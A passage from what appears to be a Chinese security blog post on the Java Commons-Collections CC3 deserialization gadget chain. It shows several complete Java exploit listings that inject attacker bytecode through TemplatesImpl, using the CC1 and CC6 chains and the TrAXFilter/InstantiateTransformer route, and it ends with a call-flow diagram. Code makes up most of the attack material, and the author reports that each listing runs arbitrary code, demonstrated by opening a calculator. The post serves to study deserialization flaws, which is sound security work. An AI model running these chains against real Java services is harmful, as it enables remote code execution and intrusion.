+</h2><p><code>&lt;font style=&quot;color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);&quot;&gt;TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。&lt;/font&gt;</code></p>
+<p><img src="/images%5c1730205438494-dc08a922-9b4e-4863-aba9-9aad79738a88.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">//        templates.newTransformer();
+</span></span><span class="line"><span class="cl">Transformer[] transformers = new Transformer[]{
+</span></span><span class="line"><span class="cl">        new ConstantTransformer(templates),
+</span></span><span class="line"><span class="cl">        new InvokerTransformer(&#34;newTransformer&#34;, null, null),
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</span></span><span class="line"><span class="cl">chainedTransformer.transform(templates);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>能弹计算器</p>
+<p>后面的链子都是正常用cc1的</p>
+<h3 id="完整exp-1">完整exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">//        templates.newTransformer();
+</span></span><span class="line"><span class="cl">Transformer[] transformers = new Transformer[]{
+</span></span><span class="line"><span class="cl">        new ConstantTransformer(templates),
+</span></span><span class="line"><span class="cl">        new InvokerTransformer(&#34;newTransformer&#34;, null, null),
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</span></span><span class="line"><span class="cl">//        chainedTransformer.transform(templates);
+</span></span><span class="line"><span class="cl">HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;&gt;();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Map&lt;Object,Object&gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer);
+</span></span><span class="line"><span class="cl">//        decoratemap.get(Runtime.class);
+</span></span><span class="line"><span class="cl">Class clz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+</span></span><span class="line"><span class="cl">Constructor&lt;?&gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class);
+</span></span><span class="line"><span class="cl">constructor.setAccessible(true);
+</span></span><span class="line"><span class="cl">Object o = constructor.newInstance(Override.class,decoratemap);
+</span></span><span class="line"><span class="cl">System.out.println(o.getClass());
+</span></span><span class="line"><span class="cl">//AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法
+</span></span><span class="line"><span class="cl">InvocationHandler invocationHandler  = (InvocationHandler) o;
+</span></span><span class="line"><span class="cl">Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
+</span></span><span class="line"><span class="cl">//        proxymap.entrySet();
+</span></span><span class="line"><span class="cl">Object ob = constructor.newInstance(Override.class,proxymap);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">serialize(ob);
+</span></span><span class="line"><span class="cl">unserialize(&#34;ser.bin&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="cc6-链的-templatesimpl-的实现方式">CC6 链的 TemplatesImpl 的实现方式
+</h2><h3 id="完整exp-2">完整exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">Transformer[] transformers = new Transformer[]{
+</span></span><span class="line"><span class="cl">        new ConstantTransformer(templates),
+</span></span><span class="line"><span class="cl">        new InvokerTransformer(&#34;newTransformer&#34;, null,null),
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</span></span><span class="line"><span class="cl">HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+</span></span><span class="line"><span class="cl">HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;&gt;();
+</span></span><span class="line"><span class="cl">//给假的
+</span></span><span class="line"><span class="cl">Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(&#34;1&#34;));
+</span></span><span class="line"><span class="cl">//因为有ConstantTransformer在,所以key不一定要Runtime.class
+</span></span><span class="line"><span class="cl">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&#34;abc&#34;);
+</span></span><span class="line"><span class="cl">//        tiedMapEntry.hashCode();
+</span></span><span class="line"><span class="cl">HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+</span></span><span class="line"><span class="cl">map.put(tiedMapEntry,&#34;123&#34;);
+</span></span><span class="line"><span class="cl">lazymap.remove(&#34;abc&#34;);
+</span></span><span class="line"><span class="cl">Class c = LazyMap.class;
+</span></span><span class="line"><span class="cl">Field factoryfield = c.getDeclaredField(&#34;factory&#34;);
+</span></span><span class="line"><span class="cl">factoryfield.setAccessible(true);
+</span></span><span class="line"><span class="cl">factoryfield.set(lazymap,chainedTransformer);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        serialize(map);
+</span></span><span class="line"><span class="cl">unserialize(&#34;ser.bin&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="回到cc3链">回到cc3链
+</h2><p>目前是到了<code>newTransformer</code>,继续找谁调用了<code>newTransformer</code></p>
+<ul>
+<li>这里主要是找到了四个，我们一个个讲解一下为什么是 <code>TrAXFilter</code> 而不是其他的。</li>
+</ul>
+<p><font style="color:rgb(80, 80, 92);">Process 这个在 main 里面，是作为一般对象用的，所以不用它。</font></p>
+<p><font style="color:rgb(80, 80, 92);">第二个</font><font style="color:rgb(80, 80, 92);"> </font><code>getOutProperties</code><font style="color:rgb(80, 80, 92);">，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。</font></p>
+<p><font style="color:rgb(80, 80, 92);">TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。</font></p>
+<p><font style="color:rgb(80, 80, 92);">最后，</font><code>TrAXFilter</code><font style="color:rgb(80, 80, 92);">，它也是不能序列化的，但是我们去到它的构造函数看，是有搞头的。</font></p>
+<p><img src="/images%5c1730208530558-479c2744-4812-453b-ae82-5184ba7faa27.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>只需要调用<code>TrAXFilter</code>的构造函数就行了</p>
+<p><font style="color:rgb(80, 80, 92);">CC3 这里的作者没有调用</font><code>InvokerTransformer</code><font style="color:rgb(80, 80, 92);">，而是调用了一个新的类 </font><code>InstantiateTransformer</code><font style="color:rgb(80, 80, 92);">。</font></p>
+<ul>
+<li><code>InstantiateTransformer</code> 这个类是用来初始化 <code>Transformer</code> 的，我们去找 <code>InstantiateTransformer</code> 类下的 <code>transform</code> 方法。</li>
+</ul>
+<p><font style="color:rgb(80, 80, 92);">完美契合我们的需求！</font></p>
+<p><img src="/images%5c1730209223691-356ca3de-e86a-42f5-acc7-01b8866d4b30.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+<img src="/images%5c1730210456831-f439392a-d463-460a-a608-6d01f7acd07a.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong>写exp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">//        templates.newTransformer();
+</span></span><span class="line"><span class="cl">Class&lt;TrAXFilter&gt; trAXFilter  = TrAXFilter.class;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} );
+</span></span><span class="line"><span class="cl">instantiateTransformer.transform(trAXFilter);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>弹计算器</p>
+<p>找<code>transform</code>找到熟悉的<code>LazyMap</code>函数</p>
+<p><img src="/images%5c1730210797112-679be9c7-84b5-4268-b79f-d67dddef0631.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>想到cc1的正链</p>
+<p><img src="/images%5c1730276240133-36773be4-3dfb-48c7-94a9-103af89d3073.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>直接把前半部分的链拿来用</p>
+<p>序列化正常,但是反序列化报错</p>
+<p>想起之前的</p>
+<p><img src="/images%5c1730277304764-5ba6d388-8136-4351-9321-fea59dc37af1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><code>setValue</code>传参无法可控</p>
+<p>所以这里还需要借助<code>ConstantTransformer</code>和<code>ChainedTransformer</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Transformer[] transformers = {
+</span></span><span class="line"><span class="cl">new ConstantTransformer(TrAXFilter.class),instantiateTransformer
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="完整exp-3">完整exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">//        templates.newTransformer();
+</span></span><span class="line"><span class="cl">Class&lt;TrAXFilter&gt; trAXFilter  = TrAXFilter.class;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} );
+</span></span><span class="line"><span class="cl">//        instantiateTransformer.transform(trAXFilter);
+</span></span><span class="line"><span class="cl">Transformer[] transformers = {
+</span></span><span class="line"><span class="cl">        new ConstantTransformer(TrAXFilter.class),instantiateTransformer,
+</span></span><span class="line"><span class="cl">        instantiateTransformer
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</span></span><span class="line"><span class="cl">HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;&gt;();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Map&lt;Object,Object&gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer);
+</span></span><span class="line"><span class="cl">//        decoratemap.get(Runtime.class);
+</span></span><span class="line"><span class="cl">Class clz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+</span></span><span class="line"><span class="cl">Constructor&lt;?&gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class);
+</span></span><span class="line"><span class="cl">constructor.setAccessible(true);
+</span></span><span class="line"><span class="cl">Object o = constructor.newInstance(Override.class,decoratemap);
+</span></span><span class="line"><span class="cl">//        System.out.println(o.getClass());
+</span></span><span class="line"><span class="cl">//AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法
+</span></span><span class="line"><span class="cl">InvocationHandler invocationHandler  = (InvocationHandler) o;
+</span></span><span class="line"><span class="cl">Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
+</span></span><span class="line"><span class="cl">//        proxymap.entrySet();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Object ob = constructor.newInstance(Override.class,proxymap);
+</span></span><span class="line"><span class="cl">//        serialize(ob);
+</span></span><span class="line"><span class="cl">unserialize(&#34;ser.bin&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功弹计算器</p>
+<h2 id="流程图">流程图
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ObjectInputStream.readObject()
+</span></span><span class="line"><span class="cl">  AnnotationInvocationHandler.readObject()
+</span></span><span class="line"><span class="cl">    ProxyMap.entrySet()
+</span></span><span class="line"><span class="cl">      AnnotationInvocationHandler.invoke()
+</span></span><span class="line"><span class="cl">        LazyMap.get()
+</span></span><span class="line"><span class="cl">          InstantiateTransformer.transform()
+</span></span><span class="line"><span class="cl">            TrAXFilter.TrAXFilter()
+</span></span><span class="line"><span class="cl">              TemplatesImpl.newTransformer()
+</span></span><span class="line"><span class="cl">                TemplatesImpl.getTransletInstance()
+</span></span><span class="line"><span class="cl">                  TemplatesImpl.defineTransletClasses()
+</span></span><span class="line"><span class="cl">                    TemplatesImpl.defineClass()
+</span></span><span class="line"><span class="cl">                      ClassLoader.defineClass()
+</span></span><span class="line"><span class="cl">                        newInstance
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images%5c1730277704798-f1a07d93-ebfe-4d27-9b95-751efe82863a.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jan 03, 2025 08:30 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/15.07ec9bda9431131849b85b2471706cd0_hudc4c77fa4a7b6e0d5307eb2ce6368816_984136_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之CommonsBeanUtils1链"
+                        
+                        data-hash="md5-B&#43;yb2pQxExhJuFskcXBs0A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java反序列化之CommonsBeanUtils1链</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/14.d93e0f38134072739c6a5e6fd2f4e025_hue39ddf12b43735ddd45d5131ec91605e_378122_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之ROME反序列化"
+                        
+                        data-hash="md5-2T4POBNAcnOcal5v0vTgJQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java反序列化之ROME反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/13.4ae40056add277ae04024c62d37ab9f6_hue1a50ceaf49ba5491ac8a39d8d7ea50c_290380_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之Commons-Collections-CC7链"
+                        
+                        data-hash="md5-SuQAVq3Sd64EAkxi03q59g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java反序列化之Commons-Collections-CC7链</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/7.7ceb02305f8119c45462668c9b61b718_hu5913cd4f38c7546b1d9ada3fa63d7ed0_3285229_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之Commons-Collections1-CC1正链"
+                        
+                        data-hash="md5-fOsCMF&#43;BGcRUYmaMm2G3GA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java反序列化之Commons-Collections1-CC1正链</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/12.c37bf00ff974e4f231e512a6338e325e_hu7f0506060fc6e44da7c9d960749b6fdc_2219880_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之Commons-Collections-CC6链"
